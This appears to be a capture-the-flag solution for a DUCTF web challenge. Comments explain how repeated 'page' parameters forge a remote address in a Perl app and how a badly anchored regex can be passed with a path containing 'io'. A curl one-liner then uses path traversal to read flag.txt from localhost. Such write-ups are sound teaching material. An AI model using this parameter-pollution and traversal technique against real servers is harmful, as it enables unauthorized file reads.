# Bug #1
# $q->param('page') can return a list if we supply more than 1 page. This
# means we can forge the value of $remote_addr to be whatever we want since
# this list expands in the function args.
#
# Bug #2
# The regex /^stat|io|maps$/ only checks if io is in the string. So we
# can provide a path on the fs that contains the string 'io'. I use
# /sys/module/vfio in the solution.

curl 'http://localhost:5000/?page=../../sys/module/vfio/../../../flag.txt&page=127.0.0.1' | grep DUCTF
